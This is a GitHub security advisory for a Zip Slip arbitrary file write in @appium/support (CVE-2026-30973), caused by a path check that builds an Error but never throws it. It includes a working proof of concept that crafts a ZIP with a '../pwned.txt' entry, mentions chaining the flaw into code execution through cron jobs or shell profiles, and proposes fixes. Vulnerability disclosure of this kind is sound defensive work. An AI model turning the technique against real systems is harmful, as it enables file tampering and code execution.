# [M] @appium/support has a Zip Slip arbitrary file write in its ZIP extraction

## Summary
Severity: Medium
Advisory: GHSA-rfx7-4xw3-gh4m
CVE: CVE-2026-30973
CWE: CWE-22
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N (CVSS_V3)
Published: 2026-03-11
Source: https://github.com/advisories/GHSA-rfx7-4xw3-gh4m
Type: github-advisory

## Affected
- npm: `@appium/support` — affected >=0 <7.0.6

## Details
## Summary

`@appium/support` contains a ZIP extraction implementation (`extractAllTo()` via `ZipExtractor.extract()`) with a path traversal (Zip Slip) check that is non-functional. The check at line 88 of `packages/support/lib/zip.js` creates an `Error` object but never throws it, allowing malicious ZIP entries with `../` path components to write files outside the intended destination directory. This affects all JS-based extractions (the default code path), not only those using the `fileNamesEncoding` option.

## Severity

**Medium** (CVSS 3.1: 6.5)

`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N`

- **Attack Vector:** Network — malicious ZIP files can be supplied over the network (e.g., app packages via URL)
- **Attack Complexity:** Low — no special conditions required beyond providing a crafted ZIP
- **Privileges Required:** None — no authentication needed to supply a malicious archive
- **User Interaction:** Required — a user or automation system must initiate extraction of the attacker's archive
- **Scope:** Unchanged — impact stays within the file system permissions of the Appium process
- **Confidentiality Impact:** None — the vulnerability enables file writes, not reads
- **Integrity Impact:** High — arbitrary file write to any location writable by the process
- **Availability Impact:** None — no direct availability impact

## Affected Component

- `packages/support/lib/zip.js` — `ZipExtractor.extract()` (line 88) and `ZipExtractor.extractEntry()` (lines 111-145)

## CWE

- **CWE-22**: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

## Description

### Missing `throw` renders Zip Slip protection non-functional

The `ZipExtractor.extract()` method contains a path traversal check intended to prevent Zip Slip attacks. However, the check creates an `Error` object as a bare expression without the `throw` keyword, making it a no-op:

```javascript
// packages/support/lib/zip.js, lines 80-93
const destDir = path.dirname(path.join(dir, fileName));
try {
    await fs.mkdir(destDir, {recursive: true});

    const canonicalDestDir = await fs.realpath(destDir);
    const relativeDestDir = path.relative(dir, canonicalDestDir);

    if (relativeDestDir.split(path.sep).includes('..')) {
        new Error(                                          // <-- BUG: missing `throw`
            `Out of bound path "${canonicalDestDir}" found while processing file ${fileName}`
        );
    }

    await this.extractEntry(entry);   // extraction proceeds unconditionally
```

The presence of a well-formatted error message and surrounding try/catch block (lines 95-99) strongly suggests the `throw` keyword was accidentally omitted.

### yauzl does not provide its own traversal protection

The upstream `yauzl` library explicitly [does not offer path traversal protection](https://github.com/thejoshwolfe/yauzl#no-path-traversal-protection) regardless of the `decodeStrings` setting. This means the vulnerability affects **all** JS-based extractions through `ZipExtractor`, not only those where `fileNamesEncoding` is set. The `fileNamesEncoding` option bypasses yauzl's string decoding (`decodeStrings: false`), but even with `decodeStrings: true`, yauzl passes through `../` path components without rejection.

### Unprotected write sinks

The `extractEntry` method writes to attacker-controlled paths with no additional validation:

```javascript
// packages/support/lib/zip.js, lines 111-145
const fileName = this.extractFileName(entry);
const dest = path.join(dir, fileName);         // resolves ../pwned.txt outside dir
// ...
await fs.symlink(link, dest);                  // symlink creation (line 143)
await pipeline(readStream, fs.createWriteStream(dest, {mode: procMode}));  // file write (line 145)
```

Additionally, `_extractEntryTo()` (line 263) used by `readEntries()` has no traversal check at all:

```javascript
const dstPath = path.resolve(destDir, entry.fileName);  // no validation
```

### Default code path is vulnerable

The `extractAllTo()` function uses the JS-based `ZipExtractor` by default. The system unzip fallback (`useSystemUnzip: true`) must be explicitly enabled and only provides protection if the system binary succeeds:

```javascript
// packages/support/lib/zip.js, lines 203-210
if (opts.useSystemUnzip) {
    try {
        await extractWithSystemUnzip(zipFilePath, dir);
        return;
    } catch (err) {
        log.warn('unzip failed; falling back to JS: %s', err.stderr || err.message);
        // Falls through to the vulnerable JS implementation
    }
}
```

## Proof of Concept

```bash
# 1) Install deps for the support package
cd packages/support
npm install --omit=dev --ignore-scripts --no-audit --no-fund --workspaces=false

# 2) Create a malicious ZIP containing a traversal entry
export WORK=/tmp/appium_zip_slip_poc
rm -rf "$WORK" && mkdir -p "$WORK/dest"
python3 - <<'PY'
import zipfile, os
work = os.environ['WORK']
zip_path = os.path.join(work, 'evil.zip')
with zipfile.ZipFile(zip_path, 'w') as z:
    z.writestr('../pwned.txt', 'ZIPSLIP_MARKER')
print('created', zip_path)
PY

# 3) Extract with the JS implementation (default path, no fileNamesEncoding needed)
node --experimental-default-type=module --experimental-specifier-resolution=node - <<'NODE'
import path from 'node:path';
import fs from 'node:fs/promises';
import { extractAllTo } from './lib/zip.js';

const work = process.env.WORK;
const zipPath = path.join(work, 'evil.zip');
const dest = path.join(work, 'dest');

await extractAllTo(zipPath, dest, { useSystemUnzip: false });

const outside = path.join(work, 'pwned.txt');
console.log('outside exists?', await fs.stat(outside).then(() => true, () => false));
console.log('outside content:', (await fs.readFile(outside, 'utf8')).trim());
NODE
# Expected output:
# outside exists? true
# outside content: ZIPSLIP_MARKER
```

## Impact

- **Arbitrary file write**: An attacker can write files to any location writable by the Appium process, outside the intended extraction directory.
- **Arbitrary symlink creation**: Malicious ZIP entries with symlink attributes can create symlinks pointing to arbitrary targets, enabling further attacks on subsequent file operations.
- **Potential code execution**: By overwriting scripts, configuration files, `node_modules` contents, cron jobs, shell profiles, or other executable artifacts, arbitrary file write can chain into remote code execution.
- **Affects all JS-based extractions**: The default code path (without `useSystemUnzip: true`) is vulnerable regardless of whether `fileNamesEncoding` is set.

## Recommended Remediation

### Option 1: Add the missing `throw` keyword (preferred — minimal fix)

```javascript
// packages/support/lib/zip.js, line 88
if (relativeDestDir.split(path.sep).includes('..')) {
    throw new Error(   // Add `throw`
        `Out of bound path "${canonicalDestDir}" found while processing file ${fileName}`
    );
}
```

This is the lowest-risk fix: it restores the clearly intended behavior of the existing check. The try/catch block at lines 95-99 will catch the error, set `canceled = true`, close the zip, and reject the promise — exactly the designed error-handling flow.

### Option 2: Add traversal protection to `_extractEntryTo` as well

The `_extractEntryTo` function (line 262) also lacks a traversal check. For defense-in-depth, add validation there too:

```javascript
async function _extractEntryTo(zipFile, entry, destDir) {
    const dstPath = path.resolve(destDir, entry.fileName);
    const canonicalDest = path.resolve(dstPath);
    const canonicalDestDir = path.resolve(destDir);
    if (!canonicalDest.startsWith(canonicalDestDir + path.sep) && canonicalDest !== canonicalDestDir) {
        throw new Error(
            `Out of bound path "${canonicalDest}" found while processing file ${entry.fileName}`
        );
    }
    // ... rest of function
}
```

## Credit

This vulnerability was discovered and reported by [bugbunny.ai](https://bugbunny.ai).

## References
- https://github.com/appium/appium/security/advisories/GHSA-rfx7-4xw3-gh4m
- https://nvd.nist.gov/vuln/detail/CVE-2026-30973
- https://github.com/appium/appium
- https://github.com/appium/appium/releases/tag/@appium/support@7.0.6
